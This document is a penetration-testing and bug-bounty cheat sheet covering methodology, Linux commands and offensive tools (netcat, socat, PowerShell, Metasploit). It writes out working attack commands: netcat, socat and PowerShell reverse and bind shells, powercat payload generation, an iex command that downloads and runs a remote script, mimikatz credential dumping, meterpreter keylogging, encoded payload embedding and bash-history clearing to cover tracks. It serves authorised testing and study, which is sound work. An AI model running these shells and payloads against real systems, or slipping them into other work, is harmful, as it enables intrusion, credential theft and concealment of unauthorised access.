### <ins>Penetration Testing cycle</ins>

#### <ins>0. Defining the Scope</ins>

#### <ins>1. Information gathering</ins>
- [Passive Information Gathering (OSINT)](#passive-information-gathering-osint)
- Location information
  - Satellite images
  - Drone recon
  - Bulding layout
- [Target validation](#target-validation)
- [User Information Gathering](#user-information-gathering)
  - Job Information
    - Employees
    - Pictures

#### <ins>2. Service enumeration</ins>
- [Active Information Gathering](#active-information-gathering)
- Finding subdomains
  - [Google Fu](#google-dorking)
  - [EasyG](#easyg)
- Fingerprinting
  - [nmap](#nmap), [Wappalyzer](https://www.wappalyzer.com/), [WhatWeb](https://github.com/urbanadventurer/WhatWeb), [BuiltWith](https://builtwith.com/)
- [Content Discovery](#content-discovery)
- [Vulnerability Scanning](#vulnerability-scanning)

#### <ins>3. Cicle</ins>
- Penetration
  - Initial Foothold
  - Privilege Escalation
  - Lateral Movement
- Maintaining access (Trojans)

#### <ins>4. House keeping</ins>
- Cleaning up rootkits
- Covering tracks

#### <ins>5. Results</ins>
- Reporting / Analysis
- Lessons Learned / Remediation


### <ins>Penetration Testing process</ins>

- Setup the environment
  - Create a dedicated folder
  - Create files like `creds.txt` and `computers.txt`
  - Notes every service found, domain, host etc.
- Check that the targets are valid and owned by client

#### <ins>1. Public Network Enumeration</ins>

1. Start a port scanning
   - light then eavy if necessary
2. Search for CVEs  and exploits for the identified services
3. If there is a web server present
   - Use `whatweb <target>`, wappalyzer or similar to gain more information about the technology
     - search for CVEs and exploits
   - search for `robots.txt`, `.svn`, `.DS_STORE`, `README.md`
   - Run a directory research
   - See the source code
   - Run `nikto` and `nuclei`
   - Brute force the login pages with custom wordlists, use `cewl` and `cupp -i`
4. If there is a ftp service present
   - test default credentials / anonymous login
   - search for CVEs and exploits
5. If there is a smb service present
   - run `nmap -vvv -p 139,445 --script=smb* <IP>`
   - test default credentials / anonymous login
   - search for CVEs and exploits (EternalBlue)
6. For Active Directory
   - run enum4linux with no user and `guest:`

#### <ins>2. Attack a Public Machine</ins>

1. Exploit the machine
   - Example: exploit a Directory Traversal in a Web Application to gain `/etc/passwd` or SSH private keys, like `id_rsa` or `id_ecdsa`
2. Use what you found to access the machine
   - Example: crack the password of `id_rsa` with `ssh2john id_rsa > ssh.hash` and `john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash`, then gain access with `ssh -i id_rsa <username>@<IP>`
3. Elevate your privileges
   - Run `PowerUp.ps1` `Invoke-AllChecks` in Windows
   - Run winPEAS or linPEAS, note:
     - System information
       - In Windows, verify the OS with `systeminfo` (winPEAS may falsely detect Windows 11 as Windows 10)
     - Network interfaces, Known hosts, and DNS Cache
     - Check what high privilege commands can be run
     - Config files, clear text passwords, connections strings etc.
     - AV Information
     - Any information about applications used
     - Any other interesting file / info
       - Check for Password Manager files, like `*.kdbx` or `config.php` and similar
     - [GTFOBins](https://gtfobins.github.io/)
   - Define all potential privilege escalation vectors
4. For Active Directory

#### <ins>3. Internal Network Access</ins>

- Password attack: test the credentials found to gain more accesses
  - use `crackmapexec` or similar
- Explore the services found
  - Example: enumerate SMB shares with `crackmapexec smb <IP> -u <user> -p <password> --shares`
- Client-side attacks
  - Perform a Phishing attack
  - If you have more information, you could leverage Microsoft Office or Windows Library Files

#### <ins>4. Internal Network Enumeration</ins>

- Once an access to an internal network machine is gained, elevate your privileges
  - See step `2.3.`
  - Gain situational awareness
- Update the file `computers.txt` to document identified internal machines and additional information about them
- In Windows AD, enumerate the AD environment and its objects
  - Use `BloodHound` and `enum4linux`
  - Check cached Credentials
    - Use mimikatz for this purpose
      - Run `privilege::debug` and `sekurlsa::logonpasswords`
- set up a SOCKS5 proxy to perform network enumeration via Nmap and CrackMapExec
  - search for accessible services, open ports, and SMB settings
  - for Windows, use Chisel
- Password attack: test the credentials found to gain more accesses

#### <ins>5. Domain Controller Access</ins>

- Elevate your privileges to `NT AUTHORITY\SYSTEM`
- Lateral Movement
  - Leverage the privileges to get access to the other machines
  - Use `Golden Ticket` and `Rubeus.exe`
- Obtain `ntds.dit`, located at `%SystemRoot%\NTDS`


### <ins>Bug Bounty Hunting</ins>

#### **Multiple targets**
- [ ] Run EasyG assetenum
- [ ] Select the interesting targets
  - Pass the subdomains to Burp Suite
  - Open them in Firefox
- [ ] Check for mobile/desktop applications
  - If there are any other non-web application, use Apkleak and Source2Url (even if OoS)
- [ ] If every asset is in scope
  - [bgp.he.net](https://bgp.he.net/)
  - [Crunchbase](https://www.crunchbase.com/)
  - [OCCRP Aleph](https://aleph.occrp.org/)
  - [duckduckgo/tracker-radar/entities](https://github.com/duckduckgo/tracker-radar/tree/main/entities)

#### **Single target**
- [ ] Recon
  + Explore the app, see and every functionality (eventually, search for documentation)
  + Crawl with Burp Suite
  + Collect endpoints with [BurpJSLinkFinder](https://github.com/InitRoot/BurpJSLinkFinder)
  + [Content Discovery](#content-discovery), use tools, [Google Dorking](#google-dorking) and [GitHub Dorking](#github-dorking)
  + Check the [Testing layers](#testing-layers)
- [ ] Authentication
  - See [Authentication vulnerabilities](#authentication-vulnerabilities)
  - Account Section
    - Profile
      - Stored or Blind [XSS](#cross-site-scripting-xss)
    - App Custom Fields
    - Integrations
      - [SSRF](#server-side-request-forgery-ssrf), [XSS](#cross-site-scripting-xss)
- [ ] [Upload Functions](#file-upload-vulnerabilities)
- [ ] Email functions, check if you can send emails from the target
  - [ ] Spoofing
  - [ ] HTML Injection
  - [ ] [XSS](#cross-site-scripting-xss)
- [ ] Feedback functions
  - Look for [Blind XSS](#cross-site-scripting-xss)
- [ ] Broken Access Control, IDOR & co
  - [IDOR Checklist](https://twitter.com/hunter0x7/status/1580211248037126145) 
- [ ] Content Types
  - Look for multipart-forms
  - Look for content type XML
  - Look for content type json
- [ ] APIs
  - Methods
  - [API Security Checklist](https://github.com/shieldfy/API-Security-Checklist)
- [ ] Errors
  - Change POST to GET
- [ ] [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/index.html), check also
  - [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
  - [OWASP Web Application Penetration Checklist](https://wiki.owasp.org/index.php/Testing_Checklist)
- [ ] [Look at the index of this repo](#index) and see if you've missed anything interesting




## Linux

Note: a lot of these commands are from [RTFM: Red Team Field Manual](https://www.goodreads.com/en/book/show/21419959) by Ben Clark and from [PEN-200: Penetration Testing with Kali Linux](https://www.offsec.com/courses/pen-200/) by Offensive Security.

<ins>**Linux Services and Networking**</ins>
```
netstat -tulpn                                           Show Linux network ports with process ID’s (PIDs)
watch ss -stplu                                          Watch TCP, UDP open ports in real time with socket summary
lsof -i                                                  Show established connections
macchanger -m MACADDR INTR                               Change MAC address on KALI Linux
ifconfig eth0 192.168.2.1/24                             Set IP address in Linux
ifconfig eth0:1 192.168.2.3/24                           Add IP address to existing network interface in Linux
ifconfig eth0 hw ether MACADDR                           Change MAC address in Linux using ifconfig
ifconfig eth0 mtu 1500                                   Change MTU size Linux using ifconfig, change 1500 to your desired MTU
dig -x 192.168.1.1                                       Dig reverse lookup on an IP address
host 192.168.1.1                                         Reverse lookup on an IP address, in case dig is not installed
dig @192.168.2.2 domain.com -t AXFR                      Perform a DNS zone transfer using dig
host -l domain.com nameserver                            Perform a DNS zone transfer using host
nbtstat -A x.x.x.x                                       Get hostname for IP address
ip addr add 192.168.2.22/24 dev eth0                     Adds a hidden IP address to Linux, does not show up when performing an ifconfig
tcpkill -9 host google.com                               Blocks access to google.com from the host machine
echo \"1\" > /proc/sys/net/ipv4/ip_forward               Enables IP forwarding, turns Linux box into a router – handy for routing traffic through a box
echo \"8.8.8.8\" > /etc/resolv.conf                      Use Google DNS
sudo systemctl start ssh                                 Start the SSH service in Kali
sudo ss -antlp | grep sshd                               Confirm that SSH has been started and is running
sudo systemctl enable ssh                                Configure SSH to start at boot time
sudo systemctl start apache2                             Start the apache service in Kali
sudo ss -antlp | grep apache                             Confirm that apache has been started and is running
sudo systemctl enable apache2                            Enable apache to start at boot time
systemctl list-unit-files                                Display all available services
ps -fe                                                   Common ps syntax to list all the processes currently running; f: display full format listing (UID, PID, PPID, etc.), e: select all processes, C: select by command name
sudo tail -f /var/log/apache2/access.log                 Monitor the Apache log file using tail command
```

<ins>**Linux User Management**</ins>
```
whoami                                                   Shows currently logged in user on Linux
id                                                       Shows currently logged in user and groups for the user
last                                                     Shows last logged in users
mount                                                    Show mounted drives
df -h                                                    Shows disk usage in human readable output
echo \"user:passwd\" | chpasswd                          Reset password in one line
getent passwd                                            List users on Linux
strings /usr/local/bin/blah                              Shows contents of none text files, e.g. whats in a binary
uname -ar                                                Shows running kernel version
history                                                  Show bash history, commands the user has entered previously
```

<ins>**Linux File Commands**</ins>
```
df -h blah                                               Display size of file / dir Linux
diff file1 file2                                         Compare / Show differences between two files on Linux
md5sum file                                              Generate MD5SUM Linux
md5sum -c blah.iso.md5                                   Check file against MD5SUM on Linux, assuming both file and .md5 are in the same dir
file blah                                                Find out the type of file on Linux, also displays if file is 32 or 64 bit
dos2unix                                                 Convert Windows line endings to Unix / Linux
base64 < input-file > output-file                        Base64 encodes input file and outputs a Base64 encoded file called output-file
base64 -d < input-file > output-file                     Base64 decodes input file and outputs a Base64 decoded file called output-file
touch -r ref-file new-file                               Creates a new file using the timestamp data from the reference file, drop the -r to simply create a file
rm -rf                                                   Remove files and directories without prompting for confirmation
mkdir -p pt/{recon,exploit,report}                       This command will create a directory pt and inside of it the directories recon, exploit and report
ls /etc/apache2/wwwold/*.conf                            Display files with certain criteria
ls -a                                                    -a option is used to display all files
ls -1                                                    Display each file in a single line
ls -l                                                    Shows detailed information about the files and directories in a directory
ls -la /usr/bin | grep zip                               Search for any file(s) in /usr/bin containing "zip"
pwd                                                      Print the current directory
cd ~                                                     Return to the home/user directory
echo "test1" > test.txt                                  Saves "test1" in the new file "test.txt"
echo "test2" >> test.txt                                 Add in a new line "test2" in the file "test.txt"
echo "hack::the::world" | awk -F "::" '{print $1, $3}'   Extr fields from a stream using a multi-character separator in awk
comm scan-a.txt scan-b.txt                               Compare files
diff -c scan-a.txt scan-b.txt                            Compare files, context format
diff -u scan-a.txt scan-b.txt                            Compare files, unified format
vimdiff scan-a.txt scan-b.txt                            Compare files using vim
```

<ins>**Misc Commands**</ins>
```
init 6                                                   Reboot Linux from the command line
gcc -o output.c input.c                                  Compile C code
gcc -m32 -o output.c input.c                             Cross compile C code, compile 32 bit binary on 64 bit Linux
unset HISTORYFILE                                        Disable bash history logging
kill -9 $$                                               Kill current session
chown user:group blah                                    Change owner of file or dir
chown -R user:group blah                                 Change owner of file or dir and all underlying files / dirs – recersive chown
chmod 600 file                                           Change file / dir permissions, see [Linux File System Permissons](#linux-file-system-permissions) for details
ssh user@X.X.X.X | cat /dev/null > ~/.bash_history       Clear bash history
man -k '^passwd$'                                        See the documentation of a command. Use the flag -k for keyword research
man 5 passwd                                             See the page 5 of the documentation
apropos descr                                            See wich description from docs matches the input for apropos
locate sbd.exe                                           Locate "sbd.exe"
sudo find / -name sbd*                                   Perform recursive search starting from root file system directory and look for files that starts with "sbd"
which sbd                                                Search in $PATH "sbd"
apt-cache search pure-ftpd                               Search for the pure-ftpd application
apt show resource-agents                                 Examine information related to the resource-agents package
sudo apt install pure-ftpd                               apt install the pure-ftpd application
sudo apt remove --purge pure-ftpd                        apt remove –purge to completely remove the pure-ftpd application
sudo dpkg -i man-db_2.7.0.2-5_amd64.deb                  dpkg -i to install the man-db application
echo "I need to try hard" | sed 's/hard/harder/'         Replac a word in the output stream
echo "Hack.The.World."| cut -f 3 -d "."                  Extract fields from the echo command output using cut
cut -d ":" -f 1 /etc/passwd                              Extract usernames from /etc/passwd using cut
wc -m < test.txt                                         Feed the wc command with the < operator
cat test.txt | wc -m                                     Pip the output of the cat command into wc
wget -O report_w.pdf https://of.io/report.pdf            Download a file through wget
curl -o report_c.pdf https://of.io/report.pdf            Download a file with curl
axel -a -n 20 -o report_a.pdf https://of.io/report.pdf   Download a file with axel; -n: number of multiple connections to use, -a: more concise progress indicator, -o specify a different file name for the downloaded file
alias lsa='ls -la'                                       Create an alias "lsa" to execute the command "ls -la"
alias mkdir='ping -c 1 localhost'                        Creat an alias that overrides the mkdir command
unalias mkdir                                            Unsett an alias
cat ~/.bashrc                                            Examin the ".bashrc" default file, the system-wide file for Bash settings located at "/etc/bash.bashrc"
chmod +x                                                 Make a file executable
xfreerdp /u:<user> /p:<password> /cert:ignore /v:<ip>    Connect with RDP
rdesktop -u <user> -p <password> <ip>                    Connect with RDP
```

<ins>**Linux environment variables**</ins>
```
export vartest=8.8.8.8                                   Declare an environment variable
env                                                      See all declared environment variables
$$                                                       Env var; Display the ID of the current shell instance
$PATH                                                    Env var; List of directories for the shell to locate executable files
PATH=$PATH:/my/new-path                                  Add a new PATH, handy for local FS manipulation
$USER                                                    Env var; Current user
$PWD                                                     Env var; Current directory path
$HOME                                                    Env var; Home directory path
HISTCONTROL                                              Env var; Defines whether or not to remove duplicate commands
export HISTCONTROL=ignoredups                            Remove duplicates from our bash history
export HISTIGNORE="&:ls:[bf]g:exit:history"              Filter basic, common commands
export HISTTIMEFORMAT='%F %T '                           Include the date/time in our bash history
```

<ins>**Linux File System Permissions**</ins>
```
777 rwxrwxrwx                                            No restriction, global WRX any user can do anything
755 rwxr-xr-x                                            Owner has full access, others can read and execute the file
700 rwx------                                            Owner has full access, no one else has access
666 rw-rw-rw-                                            All users can read and write but not execute
644 rw-r--r--                                            Owner can read and write, everyone else can read
600 rw-------                                            Owner can read and write, everyone else has no access
```

<ins>**Linux Directories**</ins>
```
/                                                        / also know as “slash” or the root
/bin                                                     Common programs, shared by the system, the system administrator and the users
/boot                                                    Boot files, boot loader (grub), kernels, vmlinuz
/dev                                                     Contains references to system devices, files with special properties
/etc                                                     Important system config files
/home                                                    Home directories for system users
/lib                                                     Library files, includes files for all kinds of programs needed by the system and the users
/lost+found                                              Files that were saved during failures are here
/mnt                                                     Standard mount point for external file systems
/media                                                   Mount point for external file systems (on some distros)
/net                                                     Standard mount point for entire remote file systems – nfs
/opt                                                     Typically contains extra and third party software
/proc                                                    A virtual file system containing information about system resources
/root                                                    root users home dir
/sbin                                                    Programs for use by the system and the system administrator
/tmp                                                     Temporary space for use by the system, cleaned upon reboot
/usr                                                     Programs, libraries, documentation etc. for all user-related programs
/var                                                     Storage for all variable files and temporary files created by users, such as log files, mail queue, print spooler, Web servers, Databases etc
```

<ins>**Linux Interesting Files / Directories**</ins>
```
/etc/passwd                                              Contains local Linux users
/etc/shadow                                              Contains local account password hashes
/etc/group                                               Contains local account groups
/etc/init.d/                                             Contains service init script – worth a look to see whats installed
/etc/hostname                                            System hostname
/etc/network/interfaces                                  Network interfaces
/etc/resolv.conf                                         System DNS servers
/etc/profile                                             System environment variables
~/.ssh/                                                  SSH keys
~/.bash_history                                          Users bash history log
/var/log/                                                Linux system log files are typically stored here
/var/adm/                                                UNIX system log files are typically stored here
/var/log/apache2/access.log                              Apache access log file typical path
/var/log/httpd/access.log                                Apache access log file typical path
/etc/fstab                                               File system mounts
```

<ins>**Examples**</ins>

- Search the /etc/passwd file for users with a shell set to /bin/false and prints the username and home directory of each user found:
`cat /etc/passwd | awk -F: '{if ($7 == "/bin/false") print "The user " $1 " home directory is " $6}'`
- Inspect Apache logs
  1. Get IPs in access.log, count the frequency and sort them: `cat access.log | cut -d " " -f 1 | sort | uniq -c | sort -urn`
  2. From the log file, pick one IP:  `cat access.log | grep '108.38.224.98' | cut -d "\"" -f 2 | uniq -c`
  3. Further inspect user's behavior: `cat access.log | grep '108.38.224.98' | grep '/admin ' | sort -u`
- [Mounting a Shared Folder on a Linux Computer](https://docs.qnap.com/operating-system/qts/4.5.x/en-us/GUID-445D5C06-7E5A-4232-AC76-CDAF48EDB655.html)
  - `mount <NAS Ethernet Interface IP>:/share/<Shared Folder Name> <Directory to Mount>`

## Tools


### <ins>EasyG</ins>

<img src="img/easyg.gif">

[EasyG](scripts/easyg.rb) is a script that I use to automate some information gathering tasks for my hacking process. It uses: amass, subfinder, github-subdomains, gobuster, anew, httprobe, naabu and nuclei. Install the necessary tools with [install.bat](scripts/install.bat) or [install.sh](scripts/install.sh) and then run `ruby easyg.rb`.

### <ins>Burp Suite</ins>

- To add a domain + subdomains in advanced scopes: `^(.*\.)?test\.com$`
- [To fix visual glitches](https://forum.portswigger.net/thread/visual-glitches-within-burp-on-secondary-screen-390bebb0)
- To add a new header
  ```
  1. Go to Proxy -> Options -> Match and Replace -> Add
  2. Change Type to Request Header
  3. As the default text says in Match 'leave blank to add a new header'
  4. Put the new header in Replace
  ```
- Analyze better the results from Intruder with Settings > "Grep - Extract"
  - Manually select in the response the value that you want to track in a new column in the results


**Cool extensions**

- [Upload Scanner](https://portswigger.net/bappstore/b2244cbb6953442cb3c82fa0a0d908fa)
- [BurpJSLinkFinder](https://github.com/InitRoot/BurpJSLinkFinder)
- [JS Miner](https://portswigger.net/bappstore/0ab7a94d8e11449daaf0fb387431225b)
- [403 Bypasser](https://portswigger.net/bappstore/444407b96d9c4de0adb7aed89e826122)
- [Autorize](https://github.com/PortSwigger/autorize)
- [Anonymous Cloud](https://portswigger.net/bappstore/ea60f107b25d44ddb59c1aee3786c6a1)
- [Software Version Reporter](https://portswigger.net/bappstore/ae62baff8fa24150991bad5eaf6d4d38)
- [Software Vulnerability Scanner](https://portswigger.net/bappstore/c9fb79369b56407792a7104e3c4352fb)
- [IP Rotate](https://portswigger.net/bappstore/2eb2b1cb1cf34cc79cda36f0f9019874)
- [Active Scan++](https://portswigger.net/bappstore/3123d5b5f25c4128894d97ea1acc4976)
- [JWT Editor](https://portswigger.net/bappstore/26aaa5ded2f74beea19e2ed8345a93dd)
- [InQL](https://portswigger.net/bappstore/296e9a0730384be4b2fffef7b4e19b1f)
- [Wsdler](https://github.com/NetSPI/Wsdler)
- [Swagger-EZ](https://github.com/RhinoSecurityLabs/Swagger-EZ)
- [Hackvertor](https://portswigger.net/bappstore/65033cbd2c344fbabe57ac060b5dd100)
- [Turbo Intruder](https://github.com/PortSwigger/turbo-intruder)
- [HTTP Request Smuggler](https://github.com/PortSwigger/http-request-smuggler)
- [BurpCustomizer](https://github.com/CoreyD97/BurpCustomizer)
- [Burp Bounty](https://burpbounty.net/)

**Browser extensions**
- [Trufflehog Chrome Extension](https://github.com/trufflesecurity/Trufflehog-Chrome-Extension)
- [Wappalyzer](https://www.wappalyzer.com/)
- [DotGit](https://github.com/davtur19/DotGit)
- [Cookie-Editor](https://cookie-editor.cgagnier.ca/)
- [Shodan for Chrome](https://chrome.google.com/webstore/detail/shodan/jjalcfnidlmpjhdfepjhjbhnhkbgleap) and [for Firefox](https://addons.mozilla.org/en-US/firefox/addon/shodan_io/)
- If you are using FireFox, you could use [FoxyProxy](https://getfoxyproxy.org/)


### <ins>Netcat</ins>

**Misc Commands**
```
nc -nv <IP> <port>                                                       Connect to a TCP port
nc -nlvp <port>                                                          Set up a listener
nc -nv <IP> <port>                                                       Connect to a listener
nc -nlvp <port> > incoming.exe                                           Receive a file
nc -nv <IP> <port> < /usr/share/windows-resources/binaries/wget.exe      Transfer a file
nc -nlvp <port> -e cmd.exe                                               Set up a bind shell
nc -nv <IP> <port> -e /bin/bash                                          Send a reverse shell
```

**Port Scanning**
```
nc -nvv -w 1 -z <IP> <PORT-RANGE>                        Use netcat to perform a TCP port scan
nc -nv -u -z -w 1 <IP> <PORT-RANGE>                      Use netcat to perform an UDP port scan
```

### <ins>Socat</ins>

**Misc Commands**
```
socat - TCP4:<remote server's ip address>:80                                    Connect to a remote server on port 80
socat TCP4-LISTEN:<PORT> STDOUT                                                 Create a listener
socat -d -d TCP4-LISTEN:<PORT> STDOUT                                           Create a listener, -d -d for more verbosity
socat TCP4-LISTEN:<PORT>,fork file:secret.txt                                   Transfer a file
socat TCP4:<IP>:<PORT> file:received_secret.txt,create                          Receive a file
socat TCP4:<IP>:<PORT> EXEC:/bin/bash                                           Send a reverse shell
socat OPENSSL-LISTEN:<PORT>,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash    Create an encrypted bind shell
socat - OPENSSL:<IP>:<PORT>,verify=0                                            Connect to an encrypted bind shell
```

**Reverse Shell**
```
socat -d -d TCP4-LISTEN:<PORT> STDOUT                                     User 1, create a listener
socat TCP4:<IP>:<PORT> EXEC:/bin/bash                                     User 2, send reverse shell to User 1
```

**Encrypted bind shell with OpenSSL**
```
$ openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 365 -out bind_shell.crt

  req: initiate a new certificate signing request
  -newkey: generate a new private key
  rsa:2048: use RSA encryption with a 2,048-bit key length.
  -nodes: store the private key without passphrase protection
  -keyout: save the key to a file
  -x509: output a self-signed certificate instead of a certificate request
  -days: set validity period in days
  -out: save the certificate to a file

$ cat bind_shell.key bind_shell.crt > bind_shell.pem
$ sudo socat OPENSSL-LISTEN:<PORT>,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash    Create an encrypted bind shell
$ socat - OPENSSL:<IP>:<PORT>,verify=0                                                 Connect to the encrypted bind shell
```

### <ins>PowerShell</ins>

**Misc Commands**
```PowerShell
Set-ExecutionPolicy Unrestricted                                                                        Set the PowerShell execution policy
Get-ExecutionPolicy                                                                                     Get value for ExecutionPolicy
(new-object System.Net.WebClient).DownloadFile('http://<IP>/<filename>','C:\<DIR>\<filename>')          Download a file
iwr -uri http://<IP>/<filename> -Outfile <filename>                                                     Download a file
powershell -c "command"                                                                                 The -c option will execute the supplied command as if it were typed at the PowerShell prompt
```

**Encode PowerShell from the command line**
- ```PowerShell
  echo "iex(cmd)" | iconv -t UTF-16LE | base64 -w 0 | xclip -sel clip
  ```
  - [[Reference](https://twitter.com/whitecyberduck/status/1660095924931010560?s=46)]

**Send a reverse shell with PowerShell**
- ```PowerShell
  powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<IP>',<PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i =$stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
  ```
- ```PowerShell
  $client = New-Object System.Net.Sockets.TCPClient('<IP>',<PORT>);
  $stream = $client.GetStream();
  [byte[]]$bytes = 0..65535|%{0};
  while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
  	$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
  	$sendback = (iex $data 2>&1 | Out-String );
  	$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
  	$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
  	$stream.Write($sendbyte,0,$sendbyte.Length);
  	$stream.Flush();
  }
  $client.Close();
  ```

**Set up a bind shell with PowerShell**
```PowerShell
powershell -c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',443);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeNameSystem.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()"
```

**Powercat**

Script: [powercat.ps1](https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1).

```PowerShell
powercat -c <IP> -p <PORT> -i C:\<DIR>\powercat.ps1                     Send a file
powercat -c <IP> -p <PORT> -e cmd.exe                                   Send a reverse shell
powercat -l -p 443 -e cmd.exe                                           Set up a bind shell; -l option to create a listener, -p to specify the listening port number, -e to have an application executed once connected
powercat -c <IP> -p <PORT> -e cmd.exe -g > reverseshell.ps1             Create a stand-alone payload
powercat -c <IP> -p <PORT> -e cmd.exe -ge > encodedreverseshell.ps1     Create an encoded stand-alone payload with powercat
```

**Load a remote PowerShell script using iex**
```PowerShell
iex (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')
```

**Execute an encoded stand-alone payload using PowerShell**
```PowerShell
powershell.exe -E ZgB1AG4AYwB0AGkAbwBuACAAUwB0AHIAZQBhAG0AMQBfAFMAZQB0AHUAcAAKAHsACgAKACAAIAAgACAAcABhAHI...
```

**Upload a file to an FTP server**
```PowerShell
$ftpRequest = [System.Net.FtpWebRequest]::Create("ftp://<IP>:<PORT>/<FILE_TO_UPLOAD>"); $ftpRequest.Credentials = New-Object System.Net.NetworkCredential("<USERNAME>", "<PASSWORD>"); $ftpRequest.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile; $fileContents = [System.IO.File]::ReadAllBytes((Resolve-Path "<FILE_TO_UPLOAD>")); $ftpRequest.ContentLength = $fileContents.Length; $requestStream = $ftpRequest.GetRequestStream(); $requestStream.Write($fileContents, 0, $fileContents.Length); $requestStream.Close(); $response = $ftpRequest.GetResponse(); $response.Close()
```
- Change `<IP>`, `<PORT>`, `<FILE_TO_UPLOAD>`, `<USERNAME>`, `<PASSWORD>`


### <ins>WireShark</ins>

**Filters**
- `net 10.10.1.0/24`, capture traffic only on the `10.10.1.0/24` address range

**Display filters**
- `tcp.port == 21`, only display FTP data

**Misc operations**
- Follow TCP stream: `Right-click` > `Follow` > `TCP Stream`

- [Display Filter Reference](https://www.wireshark.org/docs/dfref/)
- [Wireshark User’s Guide](https://www.wireshark.org/docs/wsug_html_chunked/)


### <ins>Tcpdump</ins>

```
tcpdump -r packets.pcap                                                           Read packet capture
tcpdump -n -r packets.pcap | awk -F" " '{print $3}' | sort | uniq -c | head       Read and filter the packet capture;
                                                                                  -n option to skip DNS name lookups, -r to read from our packet capture file
                                                                                  awk to print the destination IP address and port, sort and uniq -c to sort and count the number of times the field appears in the capture, respectively, head to only display the first 10 lines of the output
tcpdump -n src host <IP> -r packets.pcap                                          Tcpdump filters; src host to output only source traffic
tcpdump -n dst host <IP> -r packets.pcap                                          Tcpdump filters; dst host to output only destination traffic
tcpdump -n port <PORT> -r packets.pcap                                            Tcpdump filters; filter by port number
tcpdump -nX -r packets.pcap                                                       -X to print packet data in both HEX and ASCII format
```

**Advanced Header Filtering: display only the data packets**

1. Look for packets that have the `PSH` and `ACK` flags turned on
   - The `ACK` flag will be set for all packets sent and received after the initial 3-way handshake
   - In interactive Application Layer protocols, the `PSH` flag is frequently used to guarantee rapid delivery of a packet and prevent buffering.
2. TCP flags are defined starting from the 14th byte
   - `ACK` and `PSH` are represented by the fourth and fifth bits of the 14th byte
   - Turning on these bits would result in `00011000` = `24` in decimal, verify it with `echo "$((2#00011000))"`
3. To display packets that have the ACK or PSH flags set: `sudo tcpdump -A -n 'tcp[13] = 24' -r packets.pcap`


### <ins>Bash scripting</ins>

- Grep all the subdomains for `target.com` from `index.html`: `grep -o '[^/]*\.target\.com' index.html | sort -u > list.txt`
- Get the IPs from list.txt: `for url in $(cat list.txt); do host $url; done | grep "has address" | cut -d " " -f 4 | sort -u`



### <ins>Metasploit Framework</ins>

See: [The Metasploit Framework](https://www.metasploit.com/)

#### Starting Metasploit

```
sudo systemctl start postgresql                                start postgresql manually
sudo systemctl enable postgresql                               start postgresql at boot
sudo msfdb init                                                create the Metasploit database
sudo apt update; sudo apt install metasploit-framework         update the Metasploit Framework
sudo msfconsole -q                                             start the Metasploit Framework
```


#### MSF Syntax

```
show -h                                  help flag
show auxiliary                           list all auxiliary modules
search type:auxiliary name:smb           search for SMB auxiliary modules
back                                     move out of the current context and return to the main msf5 prompt
previous                                 switch us back to the previously selected module
services                                 display the metasploit database logs; -p: filter by port number; -s: service name; -h: help command
hosts                                    show discovered hosts
db_nmap <IP> -A -Pn                      performing a Nmap scan from within Metasploit
workspace                                list workspaces; -a: add a workspace, -d: delete a workspace
sessions -l                              list all sessions; -i: to interact with a session
transport list                           list the currently available transports for the meterpreter connection
```

To interact with a module
- `info` request more info about the module
- `show options` most modules require options
- Use `set` and `unset` to configure the options
- Use `setg` and `unsetg` to configure global options
- `show payloads` list all payloads that are compatible with the current exploit module
- `check` check if the target is vulnerable
- `run` or `exploit` to run the exploit
  - `-j` use as background job
  - `jobs` list background jobs
  - `kill` kill job


#### <ins>Exploit Modules</ins>

#### Staged vs Non-Staged Payloads

- `windows/shell_reverse_tcp` - Connect back to attacker and spawn a command shell
- `windows/shell/reverse_tcp` - Connect back to attacker, Spawn cmd shell (staged)
  - Useful, for example, if the vulnerability you need to exploit doesn't have enough buffer space to hold a full payload

#### Meterpreter

- `upload /usr/share/windows-resources/binaries/nc.exe c:\\Users\\tidus`
- `download c:\\Windows\\system32\\calc.exe /tmp/calc.exe`
- `shell` get the shell

#### Other notes

- `generate -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-resources/binaries/plink.exe -o shell_reverse_msf_encoded_embedded.exe` embedding the payload in plink.exe from within msfconsole
- Use the framework `multi/handler` to catch standard reverse shells
  - Works for all single and multi-stage payloads
  - Specify the incoming payload type

#### <ins>Post-Exploitation</ins>

```
screenshot                take a screenshot of the compromised host desktop
keyscan_start             start the keystroke sniffer
keyscan_dump              dump captured keystrokes
keyscan_stop              stop the keystroke sniffer
```

**Migrate your meterpreter process**
- `ps` view all running processes and then pick one
- `migrate <PID>` migrate the process to a target PID

**Use mimikatz from meterpreter**
- `load kiwi` run the extension kiwi
- `getsystem` acquire SYSTEM privileges
